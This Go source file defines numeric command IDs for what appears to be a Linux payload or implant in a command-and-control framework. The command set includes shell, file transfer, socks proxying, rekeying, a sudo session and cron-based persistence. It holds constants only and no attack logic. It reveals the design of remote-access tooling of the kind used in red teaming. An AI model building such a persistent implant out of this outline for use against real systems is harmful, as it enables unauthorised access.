// server/docker/payloads/Linux/cmd_ids.go

//go:build linux
// +build linux

package main

// Command IDs - must match server/internal/common/commands/registry.go
// These numeric IDs are used for command dispatch without string matching.

// Cross-platform commands (1-99)
const (
	CmdCd       = 1
	CmdLs       = 2
	CmdPwd      = 3
	CmdDownload = 4
	CmdUpload   = 5
	CmdShell    = 6
	CmdSocks    = 7
	CmdJobkill  = 8
	CmdExit     = 9
	CmdSleep    = 10
	CmdRekey    = 11
	CmdEnv      = 12
	CmdCat      = 13
	CmdHash     = 14
	CmdHashDir  = 15
	CmdPs       = 16
	CmdRm       = 17
	CmdWhoami   = 18
)

// Linux/Darwin specific commands (100-199)
const (
	CmdSudoSession = 100
	CmdPersist     = 101
	CmdPersistCron = 102
)

// CmdUnknown indicates an unrecognized command (treat as shell)
const CmdUnknown = -1
